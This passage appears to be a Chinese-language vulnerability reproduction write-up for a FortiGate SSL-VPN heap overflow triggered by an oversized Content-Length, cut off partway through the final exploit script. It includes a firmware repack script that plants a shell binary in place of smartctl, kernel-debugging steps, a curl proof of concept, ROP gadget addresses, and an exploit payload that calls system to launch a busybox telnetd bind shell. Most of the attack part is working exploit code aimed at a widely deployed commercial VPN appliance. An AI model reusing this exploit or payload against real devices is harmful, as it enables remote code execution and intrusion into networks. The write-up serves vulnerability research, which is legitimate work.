<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># repack.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ORIGINAL = <span class="string">&quot;./ori&quot;</span></span><br><span class="line">WORKING = <span class="string">&quot;./working_temp&quot;</span></span><br><span class="line">BACKUP = <span class="string">&quot;./backup&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&quot;sudo rm -rf %s&quot;</span> % WORKING)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: clean failed&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_env</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Checking env&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(ORIGINAL):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: missing directory \&quot;%s\&quot;&quot;</span> % ORIGINAL)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">&quot;%s/rootfs.gz&quot;</span> % ORIGINAL):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: missing file \&quot;%s/rootfs.gz\&quot;&quot;</span> % ORIGINAL)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">&quot;%s/busybox&quot;</span> % ORIGINAL):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: missing file \&quot;busybox\&quot;&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">&quot;/bin/busybox&quot;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: missing file \&quot;/bin/busybox\&quot;&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        os.mkdir(WORKING)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(WORKING):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: cannot create directory \&quot;%s\&quot;&quot;</span> % WORKING)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        os.mkdir(BACKUP)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BACKUP):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: cannot create directory \&quot;%s\&quot;&quot;</span> % BACKUP)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: %s&quot;</span> % e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_rfs</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Unpacking rootfs.gz&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;cp %s/rootfs.gz %s&quot;</span> % (ORIGINAL, WORKING))</span><br><span class="line">        os.system(<span class="string">&quot;cd %s &amp;&amp; gzip -d ./rootfs.gz&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;cd %s &amp;&amp; sudo cpio -idm &lt; ./rootfs&quot;</span> % WORKING)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">&quot;%s/bin.tar.xz&quot;</span> % WORKING):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error: unpack failed&quot;</span>)</span><br><span class="line">            clean()</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        </span><br><span class="line">        os.system(<span class="string">&quot;rm -rf %s/rootfs&quot;</span> % WORKING)</span><br><span class="line">        </span><br><span class="line">        key_files = [<span class="string">&quot;bin.tar.xz&quot;</span>, <span class="string">&quot;migadmin.tar.xz&quot;</span>, <span class="string">&quot;node-scripts.tar.xz&quot;</span>, <span class="string">&quot;usr.tar.xz&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> _file <span class="keyword">in</span> key_files:</span><br><span class="line">            os.system(<span class="string">&quot;sudo cp %s/%s %s/%s.tmpbak&quot;</span> % (WORKING, _file, WORKING, _file))</span><br><span class="line">            os.system(<span class="string">&quot;cd %s &amp;&amp; sudo chroot . /sbin/xz --check=sha256 -d /%s&quot;</span> % (WORKING, _file))</span><br><span class="line">            os.system(<span class="string">&quot;cd %s &amp;&amp; sudo chroot . /sbin/ftar -xf /%s&quot;</span> % (WORKING, _file[:-<span class="number">3</span>]))</span><br><span class="line">            os.system(<span class="string">&quot;sudo rm -rf %s/%s&quot;</span> % (WORKING, _file[:-<span class="number">3</span>]))</span><br><span class="line">            os.system(<span class="string">&quot;sudo mv %s/%s.tmpbak %s/%s&quot;</span> % (WORKING, _file, WORKING, _file))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: %s&quot;</span> % e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patch_init</span>():    <span class="comment"># <span class="doctag">TODO:</span> Patch it manually for now!</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.system(<span class="string">&quot;cp %s/bin/init ./&quot;</span> % WORKING)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] auto-patch is not supported in this version.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] please patch \&quot;./init\&quot;, disable rootfs check manually.\n    And rename it \&quot;./init.patched\&quot;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] input \&quot;DONE\&quot; when finish. Or \&quot;EXIT\&quot; to exit.&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            _check = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> _check == <span class="string">&quot;DONE&quot;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(<span class="string">&quot;./init.patched&quot;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Error: cannot find patched file&quot;</span>)</span><br><span class="line">                    clean()</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">elif</span> _check == <span class="string">&quot;EXIT&quot;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid input!&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: %s&quot;</span> % e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repack</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Repacking&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;sudo mv %s/bin/init %s/&quot;</span> % (WORKING, BACKUP))</span><br><span class="line">        os.system(<span class="string">&quot;sudo mv %s/bin/smartctl %s/&quot;</span> % (WORKING, BACKUP))</span><br><span class="line">        os.system(<span class="string">&quot;sudo mv ./init.patched %s/bin/init&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;gcc -g shell.c -static -o shellcode&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;sudo cp ./shellcode %s/bin/smartctl&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;sudo chmod 755 %s/bin/init %s/bin/smartctl&quot;</span> % (WORKING, WORKING))</span><br><span class="line">        os.system(<span class="string">&quot;sudo chown root:root %s/bin/init %s/bin/smartctl&quot;</span> % (WORKING, WORKING))</span><br><span class="line">        </span><br><span class="line">        os.system(<span class="string">&quot;sudo cp %s/busybox %s/bin/busybox&quot;</span> % (ORIGINAL, WORKING))</span><br><span class="line">        os.system(<span class="string">&quot;sudo cp %s/gdbserver %s/bin/gdbserver&quot;</span> % (ORIGINAL, WORKING))</span><br><span class="line">        os.system(<span class="string">&quot;sudo chmod 777 %s/bin/busybox&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;sudo chmod 777 %s/bin/gdbserver&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;sudo rm -rf %s/bin/sh&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;cd %s/bin &amp;&amp; sudo ln -s /bin/busybox sh&quot;</span> % WORKING)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># os.chdir(&#x27;%s&#x27; % WORKING)</span></span><br><span class="line">        <span class="comment"># os.system(&quot;sudo chroot . /sbin/ftar -cf bin.tar ./bin&quot;)</span></span><br><span class="line">        <span class="comment"># os.system(&quot;sudo rm -rf bin.tar.xz&quot;)</span></span><br><span class="line">        <span class="comment"># os.system(&quot;sudo chroot . /sbin/xz --check=sha256 -e bin.tar&quot;)</span></span><br><span class="line">        <span class="comment"># os.system(&quot;sudo rm -rf bin/&quot;)</span></span><br><span class="line">        <span class="comment"># os.chdir(&quot;../&quot;)</span></span><br><span class="line"></span><br><span class="line">        os.system(<span class="string">&quot;cd %s &amp;&amp; sudo sh -c &#x27;find . | cpio -H newc -o &gt; ../rootfs&#x27;&quot;</span> % WORKING)</span><br><span class="line">        os.system(<span class="string">&quot;sudo chmod 777 ./rootfs&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;cat ./rootfs | gzip &gt; ./rootfs.gz&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;sudo rm -rf ./rootfs ./init ./shellcode&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: %s&quot;</span> % e)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FortiGate VM 7.2.x automatic repack script v0.2&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Author: CataLpa @ 20230704&quot;</span>)</span><br><span class="line"></span><br><span class="line">    check_env()</span><br><span class="line">    unpack_rfs()</span><br><span class="line">    patch_init()</span><br><span class="line">    repack()</span><br><span class="line">    clean()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Done!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后把打包好的rootfs.gz替换磁盘的。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711175478698-2fcd58f4-30a3-4d52-be5c-bcc7445bf9b8.png#averageHue=%23f6f6f6&clientId=u2ebf1549-3b7d-4&from=paste&height=514&id=u780ae668&originHeight=771&originWidth=1758&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=87829&status=done&style=none&taskId=udcb80418-fcf1-4944-bd53-59b5edafc28&title=&width=1172" alt="image.png"><br />用ubuntu16挂载foritos的vm磁盘进行修改</p>
<p><a name="b7yUt"></a></p>
<h1 id="修改内核"><a href="#修改内核" class="headerlink" title="修改内核"></a>修改内核</h1><p>修改foritgate虚拟机的vmx文件，添加调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest64 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest64.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest64 = &quot;12345&quot;</span><br><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.listen.guest32.remote = &quot;TRUE&quot;</span><br><span class="line">debugStub.port.guest32 = &quot;12346&quot;</span><br></pre></td></tr></table></figure>

<p>然后ubuntu里gdb启动内核flatk文件的elf版。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ./blgme</span><br><span class="line">targate remote <span class="number">192.168</span><span class="number">.1</span><span class="number">.103</span>:<span class="number">12345</span> <span class="comment">#这里的ip是你windows主机的ip！！！！，不是ubuntu的</span></span><br><span class="line"><span class="comment">#在虚拟机启动后连接</span></span><br><span class="line">b *<span class="number">0xffffffff807ac117</span><span class="comment">#这里是我们要去修改/sbininit就是内核启动的文件</span></span><br><span class="line">c</span><br><span class="line">patch string <span class="number">0xFFFFFFFF808F3591</span> <span class="string">&quot;/bin/init&quot;</span><span class="comment">#这个地址是ida里面查看的内核文件的字符串地址</span></span><br><span class="line">patch byte <span class="number">0xFFFFFFFF808F3591</span>+<span class="number">9</span> <span class="number">0x00</span></span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<p>进入vm登录后执行diagnose hardware smartctl即可拿到vm的shell。</p>
<p><a name="NBh1X"></a></p>
<h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>使用传入的gdbserver加gdb进行调试。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep /<span class="built_in">bin</span>/sslvpnd</span><br><span class="line">gdbserver :<span class="number">23</span> -attach <span class="number">189</span></span><br></pre></td></tr></table></figure>


<p><a name="LbPya"></a></p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>根据网上的cve说的是因为content_length发生整数溢出导致申请的堆块大小过小，而拷贝长度不变导致的堆溢出。</p>
<p>在ubuntu里解压rootfs的文件，然后gdb调试sslvpnd，连接foritos。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./sslvpnd</span><br><span class="line">target remote <span class="number">192.168</span><span class="number">.18</span><span class="number">.99</span>:<span class="number">23</span></span><br><span class="line">c</span><br><span class="line">b <span class="number">0x164E6B4</span><span class="comment">#在call    _memset下个断点方便调试</span></span><br></pre></td></tr></table></figure>

<p>测试poc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;print &quot;A&quot;x100000&#x27;</span> &gt; payload2</span><br><span class="line">curl --data-binary @payload2 -H <span class="string">&#x27;Content-Length: 2147483647&#x27;</span> -vik <span class="string">&#x27;https://192.168.121.138:10443/remote/login&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711168862973-f8281867-ea64-4cce-9bbc-c775bd00adf4.png#averageHue=%23060403&clientId=u3ec81eae-c232-4&from=paste&height=237&id=u83d24370&originHeight=355&originWidth=1323&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=73074&status=done&style=none&taskId=u8bbfa17b-e851-4879-8b2c-ea5f6a63c05&title=&width=882" alt="image.png"><br />然后ida查看一下0x000000000164e6b9。发现报错地址就是call    _memset。然后查看一下0x0000000001785ba2。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711168977425-d2505664-8813-4ccf-bea3-e5721745ce67.png#averageHue=%23fcfcfc&clientId=u3ec81eae-c232-4&from=paste&height=641&id=u222ce960&originHeight=962&originWidth=1286&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=93426&status=done&style=none&taskId=uf168d40a-be75-4789-8987-67392a349d3&title=&width=857.3333333333334" alt="image.png"><br />就可以找到pool_raclloc函数。<br />memset函数的a2参数为pool_raclloc的a2。<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711170105520-a17e3f3c-2366-48ea-ab65-7067a2279290.png#averageHue=%23fcfbfb&clientId=u3ec81eae-c232-4&from=paste&height=124&id=ue42a18ff&originHeight=186&originWidth=520&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9595&status=done&style=none&taskId=u39423352-a2d3-4ddd-abd1-ad0b81edd83&title=&width=346.6666666666667" alt="image.png"><br />这里我们反推一下rsi由esi得到，esi的值为rax+1，而eax的值应该为我们输入的0x7fffffff，+1，实际rsi的值为0x80000000。然后作为_memset的第三个参数，但是这里+1后，的实际符号位为1就是负数。这里就会触发整数溢出越界。<br />如果输入的是0x100000000，那么拓展后，rsi应该为0x0000000000000001。<br />然后我们构造一个Content-Length，目标是通过memset的时候足够小，并且在memcpy的时候足够大。<br />这里我构造的是0x1b00000000。这样通过memcpy的时候的大小就只有1了。</p>
<p><a name="fan2X"></a></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过查到<img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1711173248141-3e5001fc-088a-42c5-8580-89d6130fa49b.png#averageHue=%23fdfdfd&clientId=u2ebf1549-3b7d-4&from=paste&height=359&id=uf9b18a4e&originHeight=539&originWidth=1263&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=43240&status=done&style=none&taskId=u4a41b7ea-0782-43b7-a87b-bb40a167794&title=&width=842" alt="image.png"><br />这里存在jmp rax。那我们就可以通过这个jmp rax把堆溢出转变为栈迁移的简单rop。</p>
<p><a name="rRJqq"></a></p>
<h2 id="gadget获取"><a href="#gadget获取" class="headerlink" title="gadget获取"></a>gadget获取</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary binary --ropchain &gt; gadgets.txt</span><br><span class="line">cat gadget.txt| grep <span class="string">&quot;push rdx&quot;</span>| grep <span class="string">&quot;pop rsp&quot;</span></span><br></pre></td></tr></table></figure>

<p>不直接查找的原因是因为init太大了，容易被卡死，这样先输出到文本然后再查看。<br />由之前的调试可以得到，rdx存的是字符串的起始地址。那我们就可以直接打栈迁移和ret2text了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;B&quot;</span>*<span class="number">2400</span></span><br><span class="line"><span class="comment">#payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x60b30e</span>) <span class="comment"># : pop rax ; pop rcx ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x58</span>) <span class="comment"># sell offset</span></span><br><span class="line">payload += p64(<span class="number">0x2608366</span>)  <span class="comment">#junk op, add r13, r8 ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x2608366</span>) <span class="comment">#junk op, add r13, r8 ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x2a0e1c0</span>) <span class="comment"># add rdx, rax ; mov eax, edx ; sub eax, edi ; ret</span></span><br><span class="line">payload += p64(<span class="number">0x257016a</span>) <span class="comment">#push rdx; pop rdi; ret;</span></span><br><span class="line">payload += p64(<span class="number">0x530c9e</span>) <span class="comment"># : pop rsi ; ret</span></span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment"># sell offset 0</span></span><br><span class="line">payload += p64(<span class="number">0x509382</span>)<span class="comment"># : pop rdx ; ret</span></span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span> <span class="comment"># sell offset 0</span></span><br><span class="line">payload += p64(<span class="number">0x5693D5</span>) <span class="comment"># call system</span></span><br><span class="line">payload += <span class="string">b&quot;/bin/busybox telnetd -l /bin/sh -b 192.168.18.99  -p 22&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">8</span></span><br><span class="line">raw = payload+<span class="string">b&quot;A&quot;</span>*(<span class="number">2592</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">raw += p64(gadget1)</span><br></pre></td></tr></table></figure>

<p>pop rax是用来存放system的字符串的地址偏移，pop rcx是用来弹出1的。<br />        payload +&#x3D; p64(0x2608366)  #junk op, add r13, r8 ; ret<br />        payload +&#x3D; p64(0x2608366) #junk op, add r13, r8 ; ret<br />是用来进行栈平衡。然后add rdx,rax计算字符串地址并存到rdx。然后构造system,system的2，3参数要为空。0x000000000140583a : push rdx ; pop rsp ; add edi, edi ; nop ; ret，这个指令会让执行流到我们构造的rop。</p>
<p><a name="DOHGN"></a></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int_to_bytes</span>(<span class="params">n, minlen=<span class="number">0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Convert integer to bytearray with optional minimum length. </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        arr = []</span><br><span class="line">        <span class="keyword">while</span> n:</span><br><span class="line">            n, rem = n &gt;&gt; <span class="number">8</span>, n &amp; <span class="number">0xff</span></span><br><span class="line">            arr.append(rem)</span><br><span class="line">        b = <span class="built_in">bytearray</span>(arr)</span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">0</span>:</span><br><span class="line">        b = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Only non-negative values supported&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> minlen &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(b) &lt; minlen: <span class="comment"># zero padding needed?</span></span><br><span class="line">        b = (minlen-<span class="built_in">len</span>(b)) * <span class="string">&#x27;\x00&#x27;</span> + b</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line">path = <span class="string">&quot;/remote/login&quot;</span>.encode()</span><br><span class="line"><span class="built_in">id</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;#&quot;</span>+<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="comment">#access mem addr 0x164e000 - 0x17a1fff</span></span><br><span class="line">    CL=<span class="number">0x1b00000000</span></span><br><span class="line">    <span class="comment"># push rdx ; pop rsp ; add edi, edi ; nop ; ret</span></span><br><span class="line">    gadget1 = <span class="number">0x000000000140583a</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = <span class="string">b&quot;B&quot;</span>*<span class="number">2400</span></span><br><span class="line">        <span class="comment">#payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # : pop rax ; ret</span></span><br><span class="line">        payload += p64(<span class="number">0x60b30e</span>) <span class="comment"># : pop rax ; pop rcx ; ret</span></span><br><span class="line">        payload += p64(<span class="number">0x58</span>) <span class="comment"># sell offset</span></span><br><span class="line">        payload += p64(<span class="number">0x2608366</span>)  <span class="comment">#junk op, add r13, r8 ; ret</span></span><br><span class="line">        payload += p64(<span class="number">0x2608366</span>) <span class="comment">#junk op, add r13, r8 ; ret</span></span><br><span class="line">        payload += p64(<span class="number">0x2a0e1c0</span>) <span class="comment"># add rdx, rax ; mov eax, edx ; sub eax, edi ; ret</span></span><br><span class="line">        payload += p64(<span class="number">0x257016a</span>) <span class="comment">#push rdx; pop rdi; 